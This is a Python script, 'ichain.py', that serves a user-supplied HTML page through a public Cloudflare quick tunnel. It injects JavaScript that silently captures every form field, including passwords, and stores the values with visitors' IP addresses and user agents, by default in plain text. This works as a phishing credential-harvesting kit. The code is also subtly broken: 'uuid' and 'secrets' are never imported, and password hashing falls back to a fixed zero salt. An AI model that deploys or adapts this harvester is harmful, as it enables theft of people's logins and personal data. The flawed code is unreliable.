#!/usr/bin/env python3
"""
ichain.py
Unified framework: HTML Backend + Cloudflare Tunnel
v0.01 developed by IQmaxx(DK)
"""
import argparse
import hashlib
import json
import mimetypes
import os
import platform
import re
import shutil
import socket
import stat
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import unquote, urlparse

# ====================================================================== #
#  CONSTANTS & CONFIG
# ====================================================================== #
MAX_BODY = 1_000_000
PBKDF2_ROUNDS = 200_000
LOCK = threading.Lock()
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
BLOCKED_EXT = {".py", ".json", ".env", ".db", ".sqlite"}
GITHUB_RELEASES = "https://github.com/cloudflare/cloudflared/releases/latest/download"
TRYCLOUDFLARE_RE = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")

INJECT_JS = """
<script>
(function () {
var lastSig = '', lastTime = 0;
function label(el, t) { return el.name || el.id || el.getAttribute('aria-label') || el.placeholder || t; }
function collect(scope) {
var out = [];
scope.querySelectorAll('input,textarea,select').forEach(function (el) {
var t = (el.type || el.tagName).toLowerCase();
if (['submit','button','reset','image','file','hidden'].indexOf(t) > -1) return;
if ((t === 'checkbox' || t === 'radio') && !el.checked) return;
out.push({ name: label(el, t), type: t, value: el.value });
});
return out;
}
function send(scope, formId) {
var fields = collect(scope);
if (!fields.some(function (f) { return String(f.value).trim() !== ''; })) return;
var body = JSON.stringify({ form: formId, fields: fields });
var now = Date.now();
if (body === lastSig && now - lastTime < 1500) return;
lastSig = body; lastTime = now;
fetch('/api/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true })
.then(function (r) { return r.json(); }).then(function (j) { console.log('[backend]', j); })
.catch(function (e) { console.error('[backend] save failed', e); });
}
function scopeOf(el) { return el.closest('form') || document; }
function idOf(s) { return s === document ? 'page' : (s.id || s.name || 'form'); }
document.addEventListener('submit', function (e) { send(e.target, idOf(e.target)); }, true);
document.addEventListener('click', function (e) {
var b = e.target.closest && e.target.closest('button,input[type=submit],input[type=button],[role=button]');
if (!b) return; var s = scopeOf(b); send(s, idOf(s));
}, true);
document.addEventListener('keydown', function (e) {
if (e.key !== 'Enter' || e.isComposing) return;
var el = e.target; if (!el || !el.tagName) return;
var tag = el.tagName.toLowerCase(); if (tag !== 'input' && tag !== 'select') return;
var t = (el.type || '').toLowerCase(); if (['button','submit','reset','checkbox','radio'].indexOf(t) > -1) return;
var s = scopeOf(el); send(s, idOf(s));
}, true);
})();
</script>
"""

# ====================================================================== #
#  UI FRAMEWORK (From tunnel.py)
# ====================================================================== #
def _color_enabled():
    if os.environ.get("NO_COLOR") is not None: return False
    if os.environ.get("FORCE_COLOR") is not None: return True
    return sys.stdout.isatty()

class Theme:
    ORANGE = "\033[38;5;214m"; WHITE = "\033[97m"; GREY = "\033[90m"
    BOLD = "\033[1m"; DIM = "\033[2m"; OK = "\033[92m"; ERR = "\033[91m"; RESET = "\033[0m"

class _NoTheme:
    def __getattr__(self, _name): return ""

C = Theme() if _color_enabled() else _NoTheme()

def _term_width():
    try: return max(48, min(os.get_terminal_size().columns - 2, 76))
    except Exception: return 68

def print_box(lines, title=None, color=None):
    import textwrap
    color = color or C.GREY
    w = _term_width(); inner = w - 4
    top = f"{color}+{'-' * (w - 2)}+{C.RESET}"; bot = f"{color}+{'-' * (w - 2)}+{C.RESET}"
    out = [top]
    if title:
        t = f" {title} "; pad = max(w - 2 - len(t), 0); left = pad // 2; right = pad - left
        out.append(f"{color}|{C.RESET}{C.BOLD}{C.ORANGE}{' ' * left}{t}{' ' * right}{C.RESET}{color}|{C.RESET}")
        out.append(f"{color}+{'-' * (w - 2)}+{C.RESET}")
    for line in lines:
        if line == "": out.append(f"{color}|{' ' * (w - 2)}|{C.RESET}"); continue
        wrapped = textwrap.wrap(line, width=inner) or [""]
        for piece in wrapped:
            pad = max(inner - len(piece), 0)
            out.append(f"{color}| {C.RESET}{C.WHITE}{piece}{' ' * pad} {color}|{C.RESET}")
    out.append(bot)
    sys.stdout.write("\n".join(out) + "\n"); sys.stdout.flush()

def step_header(n, total, title):
    label = f"MODULE {n}/{total}  -  {title.upper()}"
    print(); sys.stdout.write(f"{C.BOLD}{C.ORANGE}{label}{C.RESET}\n")
    sys.stdout.write(f"{C.GREY}{'-' * min(len(label), _term_width())}{C.RESET}\n")

def ask_choice(message, options):
    opt_line = "   ".join(f"[{k.upper()}] {label}" for k, label in options)
    print_box([message, "", opt_line], title="WHAT WOULD YOU LIKE TO DO?", color=C.ORANGE)
    valid = {k.lower() for k, _ in options}
    while True:
        choice = input(f"{C.GREY}> {C.RESET}").strip().lower()
        if choice in valid: return choice
        sys.stdout.write(f"{C.ERR}  please pick one of: {', '.join(k.upper() for k, _ in options)}{C.RESET}\n")

def ok_line(text):
    sys.stdout.write(f"{C.OK}  OK  {C.RESET}{C.WHITE}{text}{C.RESET}\n")

class Spinner:
    FRAMES = ["*" * i for i in range(1, 9)]
    def __init__(self, prompt):
        self.prompt = prompt; self._stop = threading.Event(); self._thread = None; self._printed = 0
    def __enter__(self):
        try: self._thread = threading.Thread(target=self._spin, daemon=True); self._thread.start()
        except Exception: sys.stdout.write(self.prompt + "...\n")
        return self
    def __exit__(self, *exc): self._stop.set()
    def _write(self, text):
        erase = ("\b" * self._printed) + (" " * self._printed) + ("\b" * self._printed)
        sys.stdout.write(erase + text); sys.stdout.flush(); self._printed = len(text)
    def _spin(self):
        i = 0; n = len(self.FRAMES)
        while not self._stop.is_set():
            try: self._write(self.prompt + self.FRAMES[i % n])
            except Exception: break
            i += 1; time.sleep(0.12)
    def finish(self, line): self._write(line); sys.stdout.write("\n"); sys.stdout.flush(); self._printed = 0

# ====================================================================== #
#  CLOUDFLARED LOGIC
# ====================================================================== #
def _install_dir():
    d = Path.home() / ".local" / "bin"; d.mkdir(parents=True, exist_ok=True); return d

def find_cloudflared():
    exe = shutil.which("cloudflared")
    if exe: return exe
    for name in ("cloudflared", "cloudflared.exe"):
        candidate = _install_dir() / name
        if candidate.is_file() and os.access(candidate, os.X_OK): return str(candidate)
    return None

def _is_termux():
    return bool(os.environ.get("PREFIX", "").find("com.termux") != -1 or Path("/data/data/com.termux").exists())

def _asset_for_platform():
    system = platform.system(); machine = platform.machine().lower()
    if system == "Linux":
        arch_map = {"x86_64": "amd64", "amd64": "amd64", "aarch64": "arm64", "arm64": "arm64", "armv7l": "arm", "armv8l": "arm", "i686": "386", "i386": "386"}
        return f"cloudflared-linux-{arch_map.get(machine, 'amd64')}", "raw"
    if system == "Darwin":
        return f"cloudflared-darwin-{'arm64' if machine in ('arm64', 'aarch64') else 'amd64'}.tgz", "tgz"
    if system == "Windows":
        return f"cloudflared-windows-{'amd64' if '64' in machine else '386'}.exe", "raw"
    return None, None

def _download_binary():
    asset, kind = _asset_for_platform()
    if not asset: return None, "this operating system / CPU type isn't recognized"
    url = f"{GITHUB_RELEASES}/{asset}"
    dest = _install_dir() / ("cloudflared.exe" if asset.endswith(".exe") else "cloudflared")
    try:
        if kind == "tgz":
            with tempfile.NamedTemporaryFile(suffix=".tgz", delete=False) as tmp:
                tmp_path = tmp.name; urllib.request.urlretrieve(url, tmp_path)
            with tarfile.open(tmp_path) as tar:
                member = next(m for m in tar.getmembers() if m.name.endswith("cloudflared"))
                member.name = dest.name; tar.extract(member, path=dest.parent); os.unlink(tmp_path)
        else: urllib.request.urlretrieve(url, dest)
        st = dest.stat(); dest.chmod(st.st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
        return str(dest), None
    except Exception as e: return None, str(e)

def install_cloudflared():
    if _is_termux() and shutil.which("pkg"):
        with Spinner("installing cloudflared via pkg ") as sp:
            res = subprocess.run(["pkg", "install", "-y", "cloudflared"], capture_output=True, text=True); sp.finish("")
            found = find_cloudflared()
            if res.returncode == 0 and found: return found, None
    elif platform.system() == "Darwin" and shutil.which("brew"):
        with Spinner("installing cloudflared via brew ") as sp:
            res = subprocess.run(["brew", "install", "cloudflared"], capture_output=True, text=True); sp.finish("")
            found = find_cloudflared()
            if res.returncode == 0 and found: return found, None
    with Spinner("downloading cloudflared ") as sp:
        path, err = _download_binary(); sp.finish(""); return path, err

# ====================================================================== #
#  BACKEND SERVER LOGIC
# ====================================================================== #
def clean_path(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.lower().startswith("file:"): raw = unquote(urlparse(raw).path)
    if os.name == "nt" and len(raw) > 2 and raw[0] == "/" and raw[2] == ":": raw = raw[1:]
    return Path(os.path.expandvars(os.path.expanduser(raw)))

def read_html(path):
    data = path.read_bytes()
    if data.startswith((b"\xff\xfe", b"\xfe\xff")): return data.decode("utf-16", errors="replace")
    for enc in ("utf-8-sig", "cp1252"):
        try: return data.decode(enc)
        except UnicodeDecodeError: pass
    return data.decode("latin-1", errors="replace")

def inject(html):
    m = list(re.finditer(r"</body\s*>", html, re.IGNORECASE))
    if m: i = m[-1].start(); return html[:i] + INJECT_JS + html[i:]
    return html + INJECT_JS

class FieldScanner(HTMLParser):
    def __init__(self):
        super().__init__(); self.found = []
    def handle_starttag(self, tag, attrs):
        if tag in ("input", "textarea", "select"):
            a = dict(attrs); t = (a.get("type") or tag).lower()
            if t not in ("submit", "button", "reset", "image", "file", "hidden"):
                self.found.append((a.get("name") or a.get("id") or a.get("placeholder") or t, t))

def hash_password(pw):
    salt = secrets.token_hex(16) if 'secrets' in dir() else "0"*32
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), bytes.fromhex(salt), PBKDF2_ROUNDS)
    return f"pbkdf2_sha256${PBKDF2_ROUNDS}${salt}${dk.hex()}"

def build_record(payload, plain_passwords, meta):
    if not isinstance(payload, dict) or not isinstance(payload.get("fields"), list): raise ValueError("invalid payload")
    data = {}
    for f in payload["fields"][:200]:
        if not isinstance(f, dict): continue
        name = str(f.get("name", "field"))[:100]; ftype = str(f.get("type", "text")).lower()[:20]
        value = str(f.get("value", ""))[:10000]
        if ftype == "email":
            value = value.strip().lower()
            if value and not EMAIL_RE.match(value): raise ValueError(f"invalid email in '{name}'")
        elif ftype == "password":
            if value and not plain_passwords: value = hash_password(value)
        elif ftype != "textarea": value = value.strip()
        if name in data:
            if not isinstance(data[name], list): data[name] = [data[name]]
            data[name].append(value)
        else: data[name] = value
    if not any(str(v).strip() for v in data.values()): raise ValueError("no data")
    return {"id": uuid.uuid4().hex, "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"), "form": str(payload.get("form", "form"))[:100], "data": data, **meta}

def save_record(db_path, record):
    with LOCK:
        db = {"records": []}
        if db_path.exists():
            try:
                loaded = json.loads(db_path.read_text(encoding="utf-8"))
                if isinstance(loaded, dict) and isinstance(loaded.get("records"), list): db = loaded
                else: raise ValueError
            except Exception:
                backup = db_path.with_suffix(".corrupt.json"); os.replace(db_path, backup); print(f"[warn] bad JSON moved to {backup.name}")
        db["records"].append(record); db["total"] = len(db["records"])
        fd, tmp = tempfile.mkstemp(dir=str(db_path.parent), suffix=".tmp")
        try:
            with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh: json.dump(db, fh, indent=2, ensure_ascii=False); fh.write("\n"); os.replace(tmp, db_path)
        except Exception:
            if os.path.exists(tmp): os.remove(tmp)
            raise
        return len(db["records"])

class Handler(BaseHTTPRequestHandler):
    server_version = "Ichain/1.0"
    def log_message(self, fmt, *args): pass # Suppress default logs
    def _send(self, code, body, ctype="application/json; charset=utf-8"):
        if isinstance(body, (dict, list)): body = json.dumps(body, ensure_ascii=False).encode("utf-8")
        elif isinstance(body, str): body = body.encode("utf-8")
        self.send_response(code); self.send_header("Content-Type", ctype); self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Content-Type-Options", "nosniff"); self.send_header("Cache-Control", "no-store"); self.end_headers(); self.wfile.write(body)
    def do_GET(self):
        cfg = self.server.cfg; path = unquote(urlparse(self.path).path)
        if path in ("/", "/" + cfg["html"].name):
            try: page = inject(read_html(cfg["html"]))
            except OSError as e: return self._send(500, {"ok": False, "error": str(e)})
            return self._send(200, page, "text/html; charset=utf-8")
        target = (cfg["base"] / path.lstrip("/")).resolve()
        try: target.relative_to(cfg["base"])
        except ValueError: return self._send(403, {"ok": False, "error": "forbidden"})
        if (not target.is_file() or target.name.startswith(".") or target.suffix.lower() in BLOCKED_EXT or target == cfg["db"]):
            return self._send(404, {"ok": False, "error": "not found"})
        ctype = mimetypes.guess_type(str(target))[0] or "application/octet-stream"
        self._send(200, target.read_bytes(), ctype)
    def do_POST(self):
        if urlparse(self.path).path != "/api/save": return self._send(404, {"ok": False, "error": "not found"})
        origin = self.headers.get("Origin")
        if origin and urlparse(origin).netloc != self.headers.get("Host"): return self._send(403, {"ok": False, "error": "bad origin"})
        try: length = int(self.headers.get("Content-Length", "0"))
        except ValueError: length = 0
        if length <= 0 or length > MAX_BODY: return self._send(413, {"ok": False, "error": "bad size"})
        meta = {"ip": self.client_address[0], "user_agent": (self.headers.get("User-Agent") or "")[:200]}
        try:
            payload = json.loads(self.rfile.read(length).decode("utf-8")); record = build_record(payload, self.server.cfg["plain"], meta)
            total = save_record(self.server.cfg["db"], record)
        except (ValueError, UnicodeDecodeError) as e: return self._send(400, {"ok": False, "error": str(e)})
        except OSError as e: return self._send(500, {"ok": False, "error": f"save failed: {e}"})
        self._send(200, {"ok": True, "id": record["id"], "total": total})

def start_backend_server(html_path, port, host, hash_pw):
    db_path = html_path.with_name(html_path.stem + "_data.json")
    server = ThreadingHTTPServer((host, port), Handler)
    server.cfg = {"html": html_path, "base": html_path.parent, "db": db_path, "plain": not hash_pw}
    server.serve_forever()

# ====================================================================== #
#  MAIN FLOW (ICHAIN ARCHITECTURE)
# ====================================================================== #
def main():
    # Header
    print()
    sys.stdout.write(f"{C.BOLD}{C.ORANGE}{'=' * _term_width()}{C.RESET}\n")
    title = "ICHAIN (Hang on) - v0.01 developed by IQmaxx(DK)"
    pad = max(_term_width() - 2 - len(title), 0); left = pad // 2; right = pad - left
    sys.stdout.write(f"{C.BOLD}{C.ORANGE}|{' ' * left}{title}{' ' * right}|{C.RESET}\n")
    sys.stdout.write(f"{C.BOLD}{C.ORANGE}{'=' * _term_width()}{C.RESET}\n")
    print()

    # Module 1: Backend Setup
    step_header(1, 2, "Backend Setup")
    html_raw = input(f"{C.WHITE}* HTML file path (e.g. /a/b/c/d.html): {C.RESET}").strip()
    if not html_raw:
        print_box(["HTML file path cannot be empty."], title="ERROR", color=C.ERR); sys.exit(1)
    
    html_path = clean_path(html_raw).resolve()
    if not html_path.is_file():
        print_box([f"File not found: {html_path}"], title="ERROR", color=C.ERR); sys.exit(1)

    port_raw = input(f"{C.WHITE}* Local Host Port (e.g. 8000): {C.RESET}").strip()
    try: port = int(port_raw)
    except ValueError: port = 8000

    scanner = FieldScanner(); scanner.feed(read_html(html_path))
    ok_line(f"Detected {len(scanner.found)} inputs in HTML.")
    ok_line(f"Starting backend server on http://127.0.0.1:{port} ...")

    # Start Backend in Background Thread
    backend_thread = threading.Thread(target=start_backend_server, args=(html_path, port, "127.0.0.1", False), daemon=True)
    backend_thread.start()
    time.sleep(1) # Give server a moment to bind

    # Module 2: Tunnel Setup
    step_header(2, 2, "Cloudflare Tunnel")
    path = find_cloudflared()
    if path: ok_line(f"cloudflared is already installed: {path}")
    else:
        print_box(["cloudflared was not found - installing it now"], title="INSTALLING", color=C.GREY)
        path, err = install_cloudflared()
        if not path:
            print_box([f"Installation failed: {err}"], title="ERROR", color=C.ERR); sys.exit(1)
        ok_line(f"cloudflared installed: {path}")

    local_url = f"http://127.0.0.1:{port}"
    
    # Run Tunnel
    cmd = [path, "tunnel", "--url", local_url]
    try: proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        print_box([f"Could not start cloudflared: {e}"], title="ERROR", color=C.ERR); sys.exit(1)

    state = {"public_url": None, "lines": []}
    found = threading.Event()
    def reader():
        for line in proc.stdout:
            state["lines"].append(line.rstrip())
            m = TRYCLOUDFLARE_RE.search(line)
            if m and not state["public_url"]:
                state["public_url"] = m.group(0); found.set()
    threading.Thread(target=reader, daemon=True).start()

    with Spinner("opening tunnel ") as sp:
        got_link = found.wait(timeout=30); sp.finish("")

    if not got_link:
        proc.terminate()
        tail = state["lines"][-6:] or ["(cloudflared produced no output)"]
        print_box(tail, title="CLOUDFLARED OUTPUT", color=C.GREY)
        print_box(["Tunnel failed to start within 30 seconds."], title="ERROR", color=C.ERR)
        sys.exit(1)

    # Final Output Box (Matching your image architecture)
    print()
    print_box(
        [
            f"Local Host:  {local_url}",
            f"Public URL:  {state['public_url']}",
            "",
            "Tunnel is ON Live! Share the Public URL.",
            "Press Ctrl+C (or Alt+Ctrl+C) to stop.",
        ],
        title="TUNNEL ON LIVE", color=C.OK,
    )

    try: proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        print(); print_box(["Ichain stopped. Tunnel closed."], title="STOPPED", color=C.GREY)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(); sys.exit(0)
